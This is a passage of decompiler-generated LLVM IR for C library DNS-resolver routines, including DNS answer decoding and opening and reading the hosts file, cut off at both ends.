  %v2_100151dc = load i32, i32* %r9.global-to-local, align 4
  %v3_100151dc = add i32 %v2_100151dc, 3
  %v4_100151dc = inttoptr i32 %v3_100151dc to i8*
  store i8 %v1_100151dc, i8* %v4_100151dc, align 1
  %v0_100151f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100151e0

dec_label_pc_100151e0:                            ; preds = %entry, %dec_label_pc_100151b4, %dec_label_pc_100151bc
  %v0_100151f0 = phi i32 [ %v2_10015198, %entry ], [ -1, %dec_label_pc_100151b4 ], [ %v0_100151f0.pre, %dec_label_pc_100151bc ]
  ret i32 %v0_100151f0

; uselistorder directives
  uselistorder i32 %v2_10015198, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_100151e0, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268521988, i32* @lr, align 4
  %v0_10015200 = call i32 @__length_dotted()
  %v1_10015204 = icmp slt i32 %v0_10015200, 0
  br i1 %v1_10015204, label %dec_label_pc_10015210, label %dec_label_pc_1001520c

dec_label_pc_1001520c:                            ; preds = %entry
  %v1_1001520c = add i32 %v0_10015200, 4
  br label %dec_label_pc_10015210

dec_label_pc_10015210:                            ; preds = %entry, %dec_label_pc_1001520c
  %v0_1001521c = phi i32 [ %v0_10015200, %entry ], [ %v1_1001520c, %dec_label_pc_1001520c ]
  ret i32 %v0_1001521c

; uselistorder directives
  uselistorder label %dec_label_pc_10015210, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10015224 = load i32, i32* @lr, align 4
  store i32 %v0_10015224, i32* %r0.global-to-local, align 4
  %v2_1001522c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1001522c, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268522064, i32* @lr, align 4
  %v2_1001524c = call i32 @__decode_dotted(i32 %v2_1001522c, i32 256)
  store i32 %v2_1001524c, i32* @r27, align 4
  %v1_10015250 = icmp slt i32 %v2_1001524c, 0
  %v0_10015254 = load i32, i32* @r28, align 4
  %v2_10015254 = add i32 %v0_10015254, %v2_1001524c
  store i32 %v2_10015254, i32* @r28, align 4
  %v1_10015258 = load i32, i32* @r29, align 4
  %v2_10015258 = sub i32 %v1_10015258, %v2_10015254
  %v1_1001525c = add i32 %v2_10015258, -10
  br i1 %v1_10015250, label %dec_label_pc_10015318, label %dec_label_pc_10015268

dec_label_pc_10015268:                            ; preds = %entry
  %v0_1001526c = load i32, i32* @r26, align 4
  %v2_1001526c = add i32 %v0_1001526c, %v2_10015254
  store i32 %v2_1001526c, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1001525c, -1
  br i1 %tmp6, label %dec_label_pc_1001527c, label %dec_label_pc_10015274

dec_label_pc_10015274:                            ; preds = %dec_label_pc_10015268
  store i32 %v1_1001525c, i32* @r27, align 4
  br label %dec_label_pc_10015318

dec_label_pc_1001527c:                            ; preds = %dec_label_pc_10015268
  store i32 268522112, i32* @lr, align 4
  %v1_1001527c = call i32 @__GI_strdup(i32 %v2_1001522c)
  %v0_10015280 = load i32, i32* @r30, align 4
  %v1_10015280 = add i32 %v0_10015280, 2
  store i32 %v1_10015280, i32* %r8.global-to-local, align 4
  %v1_10015284 = load i32, i32* @r31, align 4
  %v2_10015284 = inttoptr i32 %v1_10015284 to i32*
  store i32 %v1_1001527c, i32* %v2_10015284, align 4
  %v0_10015288 = load i32, i32* %r8.global-to-local, align 4
  %v1_10015288 = add i32 %v0_10015288, 2
  store i32 %v1_10015288, i32* %r10.global-to-local, align 4
  %v0_1001528c = load i32, i32* @r30, align 4
  %v1_1001528c = add i32 %v0_1001528c, 10
  store i32 %v1_1001528c, i32* %r6.global-to-local, align 4
  %v0_10015290 = load i32, i32* @r26, align 4
  %v1_10015290 = load i32, i32* @r28, align 4
  %v2_10015290 = add i32 %v1_10015290, %v0_10015290
  %v3_10015290 = inttoptr i32 %v2_10015290 to i8*
  %v4_10015290 = load i8, i8* %v3_10015290, align 1
  %v5_10015290 = zext i8 %v4_10015290 to i32
  store i32 %v5_10015290, i32* %r0.global-to-local, align 4
  %v1_10015294 = add i32 %v0_1001528c, 1
  %v2_10015294 = inttoptr i32 %v1_10015294 to i8*
  %v3_10015294 = load i8, i8* %v2_10015294, align 1
  %v4_10015294 = zext i8 %v3_10015294 to i32
  store i32 %v4_10015294, i32* %r9.global-to-local, align 4
  %v1_10015298 = mul nuw nsw i32 %v5_10015290, 256
  %v2_1001529c = or i32 %v4_10015294, %v1_10015298
  store i32 %v2_1001529c, i32* %r0.global-to-local, align 4
  %v1_100152a0 = load i32, i32* @r31, align 4
  %v2_100152a0 = add i32 %v1_100152a0, 4
  %v3_100152a0 = inttoptr i32 %v2_100152a0 to i32*
  store i32 %v2_1001529c, i32* %v3_100152a0, align 4
  %v0_100152a4 = load i32, i32* @r30, align 4
  %v1_100152a4 = add i32 %v0_100152a4, 2
  %v2_100152a4 = inttoptr i32 %v1_100152a4 to i8*
  %v3_100152a4 = load i8, i8* %v2_100152a4, align 1
  %v4_100152a4 = zext i8 %v3_100152a4 to i32
  store i32 %v4_100152a4, i32* %r0.global-to-local, align 4
  %v0_100152a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100152a8 = add i32 %v0_100152a8, 1
  %v2_100152a8 = inttoptr i32 %v1_100152a8 to i8*
  %v3_100152a8 = load i8, i8* %v2_100152a8, align 1
  %v4_100152a8 = zext i8 %v3_100152a8 to i32
  store i32 %v4_100152a8, i32* %r9.global-to-local, align 4
  %v1_100152ac = mul nuw nsw i32 %v4_100152a4, 256
  %v2_100152b0 = or i32 %v4_100152a8, %v1_100152ac
  store i32 %v2_100152b0, i32* %r0.global-to-local, align 4
  %v1_100152b4 = load i32, i32* @r31, align 4
  %v2_100152b4 = add i32 %v1_100152b4, 8
  %v3_100152b4 = inttoptr i32 %v2_100152b4 to i32*
  store i32 %v2_100152b0, i32* %v3_100152b4, align 4
  %v0_100152b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100152b8 = add i32 %v0_100152b8, 2
  %v2_100152b8 = inttoptr i32 %v1_100152b8 to i8*
  %v3_100152b8 = load i8, i8* %v2_100152b8, align 1
  %v4_100152b8 = zext i8 %v3_100152b8 to i32
  store i32 %v4_100152b8, i32* %r0.global-to-local, align 4
  %v0_100152bc = load i32, i32* %r10.global-to-local, align 4
  %v1_100152bc = add i32 %v0_100152bc, 1
  %v2_100152bc = inttoptr i32 %v1_100152bc to i8*
  %v3_100152bc = load i8, i8* %v2_100152bc, align 1
  %v4_100152bc = zext i8 %v3_100152bc to i32
  store i32 %v4_100152bc, i32* %r11.global-to-local, align 4
  %v1_100152c0 = add i32 %v0_100152bc, 3
  %v2_100152c0 = inttoptr i32 %v1_100152c0 to i8*
  %v3_100152c0 = load i8, i8* %v2_100152c0, align 1
  %v4_100152c0 = zext i8 %v3_100152c0 to i32
  %v1_100152c4 = mul nuw i32 %v4_100152b8, 16777216
  store i32 %v1_100152c4, i32* %r0.global-to-local, align 4
  %v1_100152c8 = add i32 %v0_100152bc, 2
  %v2_100152c8 = inttoptr i32 %v1_100152c8 to i8*
  %v3_100152c8 = load i8, i8* %v2_100152c8, align 1
  %v4_100152c8 = zext i8 %v3_100152c8 to i32
  %v1_100152cc = mul nuw nsw i32 %v4_100152bc, 65536
  %v2_100152d0 = or i32 %v1_100152cc, %v1_100152c4
  %v0_100152d4 = load i32, i32* @r28, align 4
  %v1_100152d4 = add i32 %v0_100152d4, 10
  store i32 %v1_100152d4, i32* %r11.global-to-local, align 4
  %v2_100152d8 = or i32 %v2_100152d0, %v4_100152c0
  store i32 %v2_100152d8, i32* %r0.global-to-local, align 4
  %v1_100152dc = mul nuw nsw i32 %v4_100152c8, 256
  %v2_100152e0 = or i32 %v1_100152dc, %v2_100152d8
  store i32 %v2_100152e0, i32* %r9.global-to-local, align 4
  %v1_100152e4 = load i32, i32* @r31, align 4
  %v2_100152e4 = add i32 %v1_100152e4, 12
  %v3_100152e4 = inttoptr i32 %v2_100152e4 to i32*
  store i32 %v2_100152e0, i32* %v3_100152e4, align 4
  %v0_100152e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100152e8 = add i32 %v0_100152e8, 6
  %v2_100152e8 = inttoptr i32 %v1_100152e8 to i8*
  %v3_100152e8 = load i8, i8* %v2_100152e8, align 1
  %v4_100152e8 = zext i8 %v3_100152e8 to i32
  store i32 %v4_100152e8, i32* %r9.global-to-local, align 4
  %v0_100152ec = load i32, i32* @r30, align 4
  %v1_100152ec = add i32 %v0_100152ec, 9
  %v2_100152ec = inttoptr i32 %v1_100152ec to i8*
  %v3_100152ec = load i8, i8* %v2_100152ec, align 1
  %v4_100152ec = zext i8 %v3_100152ec to i32
  store i32 %v4_100152ec, i32* %r0.global-to-local, align 4
  %v1_100152f0 = mul nuw nsw i32 %v4_100152e8, 256
  store i32 %v1_100152f0, i32* %r9.global-to-local, align 4
  %v0_100152f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100152f4 = load i32, i32* @r31, align 4
  %v2_100152f4 = add i32 %v1_100152f4, 24
  %v3_100152f4 = inttoptr i32 %v2_100152f4 to i32*
  store i32 %v0_100152f4, i32* %v3_100152f4, align 4
  %v0_100152f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100152f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_100152f8 = or i32 %v1_100152f8, %v0_100152f8
  store i32 %v2_100152f8, i32* %r9.global-to-local, align 4
  %v0_100152fc = load i32, i32* %r6.global-to-local, align 4
  %v1_100152fc = load i32, i32* @r31, align 4
  %v2_100152fc = add i32 %v1_100152fc, 20
  %v3_100152fc = inttoptr i32 %v2_100152fc to i32*
  store i32 %v0_100152fc, i32* %v3_100152fc, align 4
  %v0_10015300 = load i32, i32* @r29, align 4
  %v1_10015300 = load i32, i32* %r9.global-to-local, align 4
  %v2_10015300 = icmp slt i32 %v0_10015300, %v1_10015300
  %v1_10015304 = add i32 %v1_10015300, 10
  store i32 %v1_10015304, i32* %r0.global-to-local, align 4
  %v0_10015308 = load i32, i32* @r27, align 4
  %v2_10015308 = add i32 %v0_10015308, %v1_10015304
  store i32 %v2_10015308, i32* @r27, align 4
  %v1_1001530c = load i32, i32* @r31, align 4
  %v2_1001530c = add i32 %v1_1001530c, 16
  %v3_1001530c = inttoptr i32 %v2_1001530c to i32*
  store i32 %v1_10015300, i32* %v3_1001530c, align 4
  br i1 %v2_10015300, label %dec_label_pc_10015314, label %dec_label_pc_1001527c.dec_label_pc_10015318_crit_edge

dec_label_pc_1001527c.dec_label_pc_10015318_crit_edge: ; preds = %dec_label_pc_1001527c
  %v0_1001531c.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10015318

dec_label_pc_10015314:                            ; preds = %dec_label_pc_1001527c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10015318

dec_label_pc_10015318:                            ; preds = %dec_label_pc_1001527c.dec_label_pc_10015318_crit_edge, %entry, %dec_label_pc_10015274, %dec_label_pc_10015314
  %v0_1001531c = phi i32 [ %v0_1001531c.pre, %dec_label_pc_1001527c.dec_label_pc_10015318_crit_edge ], [ %v2_1001524c, %entry ], [ %v1_1001525c, %dec_label_pc_10015274 ], [ -1, %dec_label_pc_10015314 ]
  store i32 %v0_10015224, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001531c

; uselistorder directives
  uselistorder i32 %v1_10015300, { 1, 0, 2 }
  uselistorder i32 %v1_100152c4, { 1, 0 }
  uselistorder i32 %v1_1001525c, { 1, 2, 0 }
  uselistorder i32 %v2_1001524c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001522c, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 65536, { 0, 38, 1, 2, 40, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 39, 17, 18, 20, 19, 21, 23, 22, 24, 25, 26, 29, 28, 27, 31, 32, 30, 33, 35, 36, 34, 37 }
  uselistorder i32 3, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 1, 53, 54, 2, 0, 8, 17, 19, 18, 10, 20, 55, 9, 65, 3, 56, 57, 58, 59, 21, 60, 61, 22, 23, 24, 25, 26, 38, 66, 67, 39, 70, 41, 14, 4, 5, 64, 68, 69, 6, 75, 76, 77, 71, 72, 73, 74, 12, 63, 62, 27, 7, 13, 28, 29, 40, 15, 30, 16, 31, 32, 33, 42, 43, 34, 35, 36, 37, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 48, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 49, 16, 44, 17, 18, 19, 20, 21, 22, 23, 24, 50, 25, 51, 52, 54, 26, 27, 28, 29, 30, 53, 47, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 41, 42, 43 }
  uselistorder label %dec_label_pc_10015318, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10015334 = load i32, i32* @lr, align 4
  store i32 268522328, i32* @lr, align 4
  %v3_10015354 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1001c380.1181 to i32), i32 ptrtoint (i32* @global_var_1001c31c.1144 to i32))
  %v3_1001535c = icmp eq i32 %v3_10015354, 0
  br i1 %v3_1001535c, label %dec_label_pc_10015364, label %dec_label_pc_10015380

dec_label_pc_10015364:                            ; preds = %entry
  %v0_10015358 = load i32, i32* @r29, align 4
  store i32 %v0_10015334, i32* @lr, align 4
  %v3_1001537c = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001c38c.1182 to i32), i32 %v0_10015358)
  br label %dec_label_pc_10015380

dec_label_pc_10015380:                            ; preds = %entry, %dec_label_pc_10015364
  %v0_10015390 = phi i32 [ %v3_10015354, %entry ], [ %v3_1001537c, %dec_label_pc_10015364 ]
  ret i32 %v0_10015390

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10015380, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10015394 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_100153a8 = sub i32 0, %arg6
  %v1_100153ac = urem i32 %v1_100153a8, 4
  store i32 %v1_100153ac, i32* %r0.global-to-local, align 4
  %v3_100153ac = icmp eq i32 %v1_100153ac, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_100153c4 = load i32, i32* @r10, align 4
  store i32 %v0_100153c4, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_100153e0.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_100153ac, label %dec_label_pc_100153e0, label %dec_label_pc_100153d0

dec_label_pc_100153d0:                            ; preds = %entry
  %v2_100153d0 = icmp ult i32 %v0_100153e0.pr, %v1_100153ac
  br i1 %v2_100153d0, label %dec_label_pc_10015694, label %dec_label_pc_100153d8

dec_label_pc_100153d8:                            ; preds = %dec_label_pc_100153d0
  %v2_100153d8 = sub i32 %v0_100153e0.pr, %v1_100153ac
  store i32 %v2_100153d8, i32* %r9.global-to-local, align 4
  %v2_100153dc = add i32 %v1_100153ac, %arg6
  store i32 %v2_100153dc, i32* @r30, align 4
  br label %dec_label_pc_100153e0

dec_label_pc_100153e0:                            ; preds = %entry, %dec_label_pc_100153d8
  %v0_100153ec = phi i32 [ %v2_100153dc, %dec_label_pc_100153d8 ], [ %arg6, %entry ]
  %v0_100153f0 = phi i32 [ %v2_100153d8, %dec_label_pc_100153d8 ], [ %v0_100153e0.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_100153f0, 32
  br i1 %tmp49, label %dec_label_pc_10015694, label %dec_label_pc_100153e8

dec_label_pc_100153e8:                            ; preds = %dec_label_pc_100153e0
  %v3_100153e8 = icmp eq i32 %arg4, 1
  %v1_100153ec = add i32 %v0_100153ec, 32
  store i32 %v1_100153ec, i32* @r24, align 4
  %v1_100153f0 = add i32 %v0_100153f0, -32
  store i32 %v1_100153f0, i32* @r27, align 4
  br i1 %v3_100153e8, label %dec_label_pc_100154f0, label %dec_label_pc_100153f8

dec_label_pc_100153f8:                            ; preds = %dec_label_pc_100153e8
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10015400 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10015400, align 4
  %tmp50 = icmp ult i32 %v1_100153f0, 4
  br i1 %tmp50, label %dec_label_pc_10015694, label %dec_label_pc_10015408

dec_label_pc_10015408:                            ; preds = %dec_label_pc_100153f8
  %v0_10015408 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015408 = add i32 %v0_10015408, -36
  store i32 %v1_10015408, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10015408, 8
  br i1 %tmp51, label %dec_label_pc_10015694, label %dec_label_pc_10015414

dec_label_pc_10015414:                            ; preds = %dec_label_pc_10015408
  %v0_10015414 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10015414, 16
  br i1 %tmp52, label %dec_label_pc_10015694, label %dec_label_pc_1001541c

dec_label_pc_1001541c:                            ; preds = %dec_label_pc_10015414
  %v1_1001541c = add i32 %v0_10015408, -48
  store i32 %v1_1001541c, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1001541c, 8
  br i1 %tmp53, label %dec_label_pc_10015694, label %dec_label_pc_10015428

dec_label_pc_10015428:                            ; preds = %dec_label_pc_1001541c
  %v1_10015428 = add i32 %v0_10015408, -56
  store i32 %v1_10015428, i32* %r0.global-to-local, align 4
  %v1_1001542c = add i32 %v0_10015408, -44
  store i32 %v1_1001542c, i32* @r27, align 4
  %v3_10015430 = icmp ugt i32 %v1_10015428, %v1_1001542c
  %v0_10015434 = load i32, i32* @r30, align 4
  %v1_10015434 = add i32 %v0_10015434, 36
  store i32 %v1_10015434, i32* @r29, align 4
  %v1_10015438 = add i32 %v0_10015434, 48
  store i32 %v1_10015438, i32* @r26, align 4
  br i1 %v3_10015430, label %dec_label_pc_1001544c, label %dec_label_pc_10015444

dec_label_pc_10015444:                            ; preds = %dec_label_pc_10015428
  store i32 %v1_10015428, i32* @r27, align 4
  br label %dec_label_pc_1001544c

dec_label_pc_1001544c:                            ; preds = %dec_label_pc_10015428, %dec_label_pc_10015444
  %v0_1001544c = phi i32 [ %v1_10015428, %dec_label_pc_10015444 ], [ %v1_1001542c, %dec_label_pc_10015428 ]
  %tmp54 = icmp ult i32 %v0_1001544c, 80
  br i1 %tmp54, label %dec_label_pc_10015694, label %dec_label_pc_10015454

dec_label_pc_10015454:                            ; preds = %dec_label_pc_1001544c
  store i32 268522584, i32* @lr, align 4
  %v0_10015454 = call i32 @__open_etc_hosts()
  store i32 %v0_10015454, i32* @r20, align 4
  %v3_10015458 = icmp eq i32 %v0_10015454, 0
  br i1 %v3_10015458, label %dec_label_pc_10015478, label %dec_label_pc_10015460

dec_label_pc_10015460:                            ; preds = %dec_label_pc_10015454
  %v0_10015460 = load i32, i32* @r24, align 4
  store i32 %v0_10015460, i32* @r25, align 4
  %v0_10015468 = load i32, i32* @r26, align 4
  store i32 %v0_10015468, i32* @r23, align 4
  %v0_1001546c = load i32, i32* @r31, align 4
  store i32 %v0_1001546c, i32* @r24, align 4
  store i32 %v0_10015460, i32* %r21.global-to-local, align 4
  %v1_10015508.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10015500

dec_label_pc_10015478:                            ; preds = %dec_label_pc_10015454
  %v1_10015478 = load i32, i32* %r17.global-to-local, align 4
  %v2_10015478 = inttoptr i32 %v1_10015478 to i32*
  store i32 0, i32* %v2_10015478, align 4
  %v0_1001547c = call i32 @__errno_location()
  %v1_10015480 = inttoptr i32 %v0_1001547c to i32*
  %v2_10015480 = load i32, i32* %v1_10015480, align 4
  store i32 %v2_10015480, i32* @r26, align 4
  br label %dec_label_pc_10015698

dec_label_pc_10015488:                            ; preds = %dec_label_pc_10015628
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001548c = load i32, i32* @r25, align 4
  %v1_1001548c = load i32, i32* @r22, align 4
  %v2_1001548c = inttoptr i32 %v1_1001548c to i32*
  store i32 %v0_1001548c, i32* %v2_1001548c, align 4
  %v0_10015490 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015490 = load i32, i32* @r22, align 4
  %v2_10015490 = add i32 %v1_10015490, 4
  %v3_10015490 = inttoptr i32 %v2_10015490 to i32*
  store i32 %v0_10015490, i32* %v3_10015490, align 4
  %v0_10015494 = load i32, i32* @r30, align 4
  %v1_10015494 = add i32 %v0_10015494, 8
  store i32 %v1_10015494, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1001549c = add i32 %v0_10015494, 4
  %v2_1001549c = inttoptr i32 %v1_1001549c to i32*
  %v3_1001549c = load i32, i32* %v2_1001549c, align 4
  store i32 %v3_1001549c, i32* %r0.global-to-local, align 4
  %v0_100154a0 = load i32, i32* %r19.global-to-local, align 4
  %v1_100154a0 = load i32, i32* @r28, align 4
  %v2_100154a0 = add i32 %v1_100154a0, 8
  %v3_100154a0 = inttoptr i32 %v2_100154a0 to i32*
  store i32 %v0_100154a0, i32* %v3_100154a0, align 4
  %v0_100154a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100154a4 = load i32, i32* @r28, align 4
  %v2_100154a4 = inttoptr i32 %v1_100154a4 to i32*
  store i32 %v0_100154a4, i32* %v2_100154a4, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_100154ac = load i32, i32* @r28, align 4
  %v2_100154ac = add i32 %v1_100154ac, 12
  %v3_100154ac = inttoptr i32 %v2_100154ac to i32*
  store i32 4, i32* %v3_100154ac, align 4
  %v0_100154b0 = load i32, i32* @r22, align 4
  %v1_100154b0 = load i32, i32* @r28, align 4
  %v2_100154b0 = add i32 %v1_100154b0, 16
  %v3_100154b0 = inttoptr i32 %v2_100154b0 to i32*
  store i32 %v0_100154b0, i32* %v3_100154b0, align 4
  br label %dec_label_pc_100154e4

dec_label_pc_100154b8:                            ; preds = %dec_label_pc_1001564c
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100154bc = load i32, i32* %r21.global-to-local, align 4
  %v1_100154bc = load i32, i32* @r23, align 4
  %v2_100154bc = inttoptr i32 %v1_100154bc to i32*
  store i32 %v0_100154bc, i32* %v2_100154bc, align 4
  %v0_100154c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100154c0 = load i32, i32* @r23, align 4
  %v2_100154c0 = add i32 %v1_100154c0, 4
  %v3_100154c0 = inttoptr i32 %v2_100154c0 to i32*
  store i32 %v0_100154c0, i32* %v3_100154c0, align 4
  %v0_100154c4 = load i32, i32* @r30, align 4
  %v1_100154c4 = add i32 %v0_100154c4, 8
  store i32 %v1_100154c4, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_100154cc = add i32 %v0_100154c4, 4
  %v2_100154cc = inttoptr i32 %v1_100154cc to i32*
  %v3_100154cc = load i32, i32* %v2_100154cc, align 4
  store i32 %v3_100154cc, i32* %r0.global-to-local, align 4
  %v0_100154d0 = load i32, i32* %r19.global-to-local, align 4
  %v1_100154d0 = load i32, i32* @r28, align 4
  %v2_100154d0 = add i32 %v1_100154d0, 8
  %v3_100154d0 = inttoptr i32 %v2_100154d0 to i32*
  store i32 %v0_100154d0, i32* %v3_100154d0, align 4
  %v0_100154d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100154d4 = load i32, i32* @r28, align 4
  %v2_100154d4 = inttoptr i32 %v1_100154d4 to i32*
  store i32 %v0_100154d4, i32* %v2_100154d4, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_100154dc = load i32, i32* @r28, align 4
  %v2_100154dc = add i32 %v1_100154dc, 12
  %v3_100154dc = inttoptr i32 %v2_100154dc to i32*
  store i32 16, i32* %v3_100154dc, align 4
  %v0_100154e0 = load i32, i32* @r23, align 4
  %v1_100154e0 = load i32, i32* @r28, align 4
  %v2_100154e0 = add i32 %v1_100154e0, 16
  %v3_100154e0 = inttoptr i32 %v2_100154e0 to i32*
  store i32 %v0_100154e0, i32* %v3_100154e0, align 4
  br label %dec_label_pc_100154e4

dec_label_pc_100154e4:                            ; preds = %dec_label_pc_10015488, %dec_label_pc_100154b8
  %v0_100154e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100154e4 = load i32, i32* @r28, align 4
  %v2_100154e4 = add i32 %v1_100154e4, 4
  %v3_100154e4 = inttoptr i32 %v2_100154e4 to i32*
  store i32 %v0_100154e4, i32* %v3_100154e4, align 4
  %v0_100154e8 = load i32, i32* @r28, align 4
  %v1_100154e8 = load i32, i32* %r17.global-to-local, align 4
  %v2_100154e8 = inttoptr i32 %v1_100154e8 to i32*
  store i32 %v0_100154e8, i32* %v2_100154e8, align 4
  br label %dec_label_pc_10015680

dec_label_pc_100154f0:                            ; preds = %dec_label_pc_100153e8
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10015500

dec_label_pc_10015500:                            ; preds = %dec_label_pc_10015460, %dec_label_pc_100154f0
  %v1_10015508 = phi i32 [ %v1_10015508.pre, %dec_label_pc_10015460 ], [ %arg8, %dec_label_pc_100154f0 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10015508 = inttoptr i32 %v1_10015508 to i32*
  store i32 1, i32* %v2_10015508, align 4
  br label %dec_label_pc_10015668

dec_label_pc_10015510:                            ; preds = %dec_label_pc_10015668
  %v0_10015510 = load i32, i32* @r24, align 4
  store i32 %v0_10015510, i32* @r3, align 4
  store i32 268522780, i32* @lr, align 4
  %v2_10015518 = call i32 @__GI_strchr(i32 %v0_10015510, i32 35)
  %v4_1001551c = icmp eq i32 %v2_10015518, 0
  br i1 %v4_1001551c, label %dec_label_pc_1001552c, label %dec_label_pc_10015524

dec_label_pc_10015524:                            ; preds = %dec_label_pc_10015510
  %v3_10015518 = inttoptr i32 %v2_10015518 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10015518, align 1
  br label %dec_label_pc_1001552c

dec_label_pc_1001552c:                            ; preds = %dec_label_pc_10015510, %dec_label_pc_10015524
  %v0_1001552c = load i32, i32* @r24, align 4
  store i32 %v0_1001552c, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_100155a817 = inttoptr i32 %v0_1001552c to i8*
  %v2_100155a818 = load i8, i8* %v1_100155a817, align 1
  %v3_100155a819 = zext i8 %v2_100155a818 to i32
  store i32 %v3_100155a819, i32* %r0.global-to-local, align 4
  %v3_100155ac21 = icmp eq i8 %v2_100155a818, 0
  br i1 %v3_100155ac21, label %dec_label_pc_100155b4, label %dec_label_pc_10015544.preheader

dec_label_pc_10015538:                            ; preds = %dec_label_pc_10015554
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1001553c = inttoptr i32 %v0_10015578 to i8*
  store i8 0, i8* %v3_1001553c, align 1
  %v0_10015540 = load i32, i32* %r11.global-to-local, align 4
  %v1_10015540 = add i32 %v0_10015540, 1
  store i32 %v1_10015540, i32* %r11.global-to-local, align 4
  %v1_10015544 = inttoptr i32 %v1_10015540 to i8*
  %v2_10015544 = load i8, i8* %v1_10015544, align 1
  %v3_10015544 = zext i8 %v2_10015544 to i32
  store i32 %v3_10015544, i32* %r0.global-to-local, align 4
  %v3_10015548 = icmp eq i8 %v2_10015544, 0
  br i1 %v3_10015548, label %dec_label_pc_100155b4, label %dec_label_pc_10015554

dec_label_pc_10015554:                            ; preds = %dec_label_pc_10015544.preheader, %dec_label_pc_10015538
  %v0_10015578 = phi i32 [ %v1_10015540, %dec_label_pc_10015538 ], [ %v0_100155442, %dec_label_pc_10015544.preheader ]
